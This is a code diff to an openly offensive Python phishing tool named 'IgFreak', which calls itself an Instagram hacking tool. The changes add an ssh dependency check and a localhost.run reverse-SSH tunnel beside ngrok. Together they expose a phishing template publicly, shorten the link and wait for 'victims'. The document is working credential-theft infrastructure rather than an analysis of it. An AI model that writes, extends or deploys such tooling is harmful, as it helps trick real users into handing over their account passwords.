@@ -62,7 +62,6 @@ W = Style.BRIGHT+Fore.WHITE
 R = Style.BRIGHT+Fore.RED
 version = 2.0
 def check_d():
-
     php = os.system("command -v  php > /dev/null")
     if php == 0:
         pass
@@ -72,6 +71,17 @@ def check_d():
         if php_install.lower() == "y":
             os.system("apt-get update")
             os.system("apt-get install php")
+            return check_d()
+    php2 = os.system("command -v  ssh > /dev/null")
+    if php2 == 0:
+        pass
+    else:
+        print(f"{R}[!] ssh - 404 NOT FOUND !")
+        php_install = input(f"{B}\n[?] What to Install It Now ? (y/n) : {W}")
+        if php_install.lower() == "y":
+            os.system("apt-get update")
+            os.system("apt install openssh ")
+            os.system("apt-get install ssh ")
             return check_d()
 
 code = """
@@ -258,11 +268,21 @@ def phish(template):
 	
 	{B}       STARTING SERVERS
 {G}{"="*25}{Y}  LOGS  {G}{"="*25}{R}""")
-	link = startServicea(template+"/",port)
-	print(f'{G}{"="*25}{Y}LOGS END{G}{"="*25}{R}')
-	print(f"\n{G} LINK = {Y} {link}")
-	print(f"\n{G} LINK STATUS CODE = {W}[{G}{requests.get(link).status_code}{W}] ")
-	print(f"\n{G} SHORT LINK = {Y} {short(link)}")
+	a = startServicea(template+"/",port)
+	link = a["link"]
+	link2 = a["link2"]
+	if link=="":
+		print(f'{G}{"="*25}{Y}LOGS END{G}{"="*25}{R}')
+		print(f"{R}NGROK LINK DEPLOY FAILED")
+		pass
+	else:
+		print(f'{G}{"="*25}{Y}LOGS END{G}{"="*25}{R}')
+		print(f"\n{G} NGROK LINK = {Y} {link}")
+		print(f"{G} LINK STATUS CODE = {W}[{G}{requests.get(link).status_code}{W}] ")
+		print(f"{G} SHORT LINK = {Y} {short(link)}\n")
+	print(f"\n{B} LOCALHOST.RUN LINK = {Y} {link2}")
+	print(f"{B} LINK STATUS CODE = {W}[{G}{requests.get(link2).status_code}{W}] ")
+	print(f"{B} SHORT LINK = {Y} {short(link2)}")
 	print()
 	print(f"{B}[{G}>{B}]{W} Wating for victims ...[ {G} Press Ctrl + C to exit {W} ]")
 	def check(file):
@@ -299,11 +319,18 @@ def startServicea(folder,port):
 	fileok = os.system(code)
 	import time
 	time.sleep(3)
-	link =  ngrok.connect(port,'http')
-	ngrok.get_ngrok_process().stop_monitor_thread()
-	link = str(link).replace('NgrokTunnel: "','')
-	link = link[:-28]
-	return link
+	try:
+		link =  ngrok.connect(port,'http')
+		ngrok.get_ngrok_process().stop_monitor_thread()
+		link = str(link).replace('NgrokTunnel: "','')
+		link = link[:-28]
+	except Exception as e:
+		link = ""
+		pass
+	command = f"""echo 'ssh -R 80:localhost:{port} nokey@localhost.run > ok.txt' > tmp.sh && sh -c 'sh tmp.sh > /dev/null 2>&1  &' && rm tmp.sh && sleep 10 && cat ok.txt | grep -o "https://[0-9A-Za-z.-]*\.lhr.life" && rm ok.txt"""
+	oo = subprocess.check_output(command,shell=True)
+	link2 = (str(oo.decode())[:-1])
+	return {"link" : link ,"link2" : link2}
 
 def printInfo(str):
 	print(f"{Fore.MAGENTA}IgFreak , Slick Instagram Hacking command line tool. Copyright (C) 2021, T-Dynamos Ansh Dadwal\n .")
